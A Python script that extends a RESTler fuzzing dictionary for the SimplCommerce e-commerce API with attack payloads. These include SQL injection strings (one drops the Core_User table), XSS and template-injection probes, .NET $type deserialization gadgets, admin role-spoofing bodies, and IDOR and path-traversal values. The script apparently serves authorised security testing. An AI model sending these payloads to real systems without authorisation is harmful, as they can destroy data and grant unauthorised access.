import json
import os

dict_path = "grammars/simplcommerce/dict.json"
with open(dict_path, "r") as f:
    d = json.load(f)

# 1. SQLi Payloads (SimplCommerce uses EF, but we want to catch raw SQL interpolations)
sqli_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE Core_User--",
    "' UNION SELECT null, null, null--",
    "1; WAITFOR DELAY '0:0:5'--"
]

# 2. XSS & Template Injection (Angular/Razor)
xss_payloads = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "{{7*7}}",
    "javascript:alert(1)"
]

# 3. Mass Assignment / Type Confusion / Serialization
dotnet_payloads = [
    "{\"$type\":\"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install\"}",
    "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}",
    "{\"IsAdmin\":true,\"RoleId\":1}", # Role spoofing
    "{\"IsSystemRole\":true}"
]

# 4. IDOR / Tenant Escape
tenant_payloads = [
    "0", "1", "2", "-1", "-999", "999999", 
    "Vendor-0001", "Vendor-0042",
    "../", "..\\", "%2e%2e%2f"
]

all_payloads = sqli_payloads + xss_payloads + dotnet_payloads + tenant_payloads

# Add to global string fuzzing
d["restler_fuzzable_string"].extend(all_payloads)

# Add to specific custom payloads if they exist (to target specific fields)
if "restler_custom_payload" in d:
    # Target search, names, and slugs with SQLi and XSS
    for key in ["search", "Search", "name", "Name", "slug", "Slug"]:
        if key in d["restler_custom_payload"]:
            d["restler_custom_payload"][key].extend(sqli_payloads + xss_payloads)
    
    # Target Roles and Users with Mass Assignment
    for key in ["roleId", "RoleId", "userGuid", "UserGuid", "vendorId", "VendorId"]:
        if key not in d["restler_custom_payload"]:
            d["restler_custom_payload"][key] = []
        d["restler_custom_payload"][key].extend(["1", "0", "-1", "99999", "{\"IsAdmin\":true}"])

# Deduplicate
d["restler_fuzzable_string"] = list(set(d["restler_fuzzable_string"]))
for key in d.get("restler_custom_payload", {}):
    d["restler_custom_payload"][key] = list(set(d["restler_custom_payload"][key]))

with open(dict_path, "w") as f:
    json.dump(d, f, indent=2)
print("Dictionary updated successfully.")
